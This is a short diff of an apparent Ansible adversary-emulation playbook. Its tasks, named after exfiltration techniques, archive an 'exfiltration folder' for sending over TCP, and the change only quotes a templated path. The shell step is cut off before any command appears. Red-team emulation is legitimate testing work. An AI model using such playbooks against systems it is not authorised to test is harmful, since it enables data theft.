@@ -21,7 +21,7 @@
       when: exfil_check.stat.exists
     - name: Exfiltration Over Alternative Protocol TCP
       archive:
-        path: {{ exfiltration_folder }}/*
+        path: "{{ exfiltration_folder }}/*"
         dest: {{ exfiltration_file }}-tcp.gz
         format: gz
       shell: |
